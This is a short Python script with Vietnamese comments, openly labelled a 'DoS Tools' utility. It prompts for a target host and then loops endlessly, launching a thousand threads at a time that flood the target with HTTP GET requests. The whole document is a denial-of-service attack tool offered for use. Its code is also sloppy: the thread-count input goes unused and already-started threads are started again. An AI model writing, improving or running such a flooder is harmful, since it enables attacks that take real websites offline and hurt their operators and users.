# Tạo Thư Viện Cho Tools

import requests
import socket
import threading
import time
import colorama
from colorama import Fore
from colorama import Style

colorama.init()

# tạo hàm banner
def banner():
  print(Fore.RED + '''
·▄▄▄▄        .▄▄ · 
██▪ ██ ▪     ▐█ ▀. 
▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄
██. ██ ▐█▌.▐▌▐█▄▪▐█
▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ 
..::[DoS Tools]::..
..::[CPR : Chien]::.. ''' + Style.RESET_ALL)
  print("")

banner()

# thiết lập target và get ip
update_target = input("Target : ")
# get ip
get_ip = socket.gethostbyname(update_target)
update_thread = input("Threads : ") 

# setup thời gian nhất định đế tấn công
time.sleep(3)
print("")
print(Fore.GREEN + "[+] {} : {}".format(update_target, get_ip))
time.sleep(3)
print(Fore.RED + "[!] Starting Attack On 5 Secount")
time.sleep(1)
print(Fore.RED + "[!] Attack On 5 Secount")
time.sleep(1)
print(Fore.RED + "[!] Attack On 4 Secount")
time.sleep(1)
print(Fore.RED + "[!] Attack On 3 Secount")
time.sleep(1)
print(Fore.RED + "[!] Attack On 2 Secount")
time.sleep(1)
print(Fore.RED + "[!] Attack On 1 Secount")
time.sleep(1)

num_get = 0
run = True
while run:
  num_get += 1
  def request_url(url):
    response = requests.get("http://" + update_target)
    print(Fore.GREEN + "[{}] Reponsing Finished To => {}".format(num_get, get_ip))

  if __name__ == '__main__':
    num_response = 1000

    threads = []

    for i in range(num_response):
      t = threading.Thread(target=request_url, args=(update_target,))
      threads.append(t)
      t.start()

    for t in threads:
      t.start()
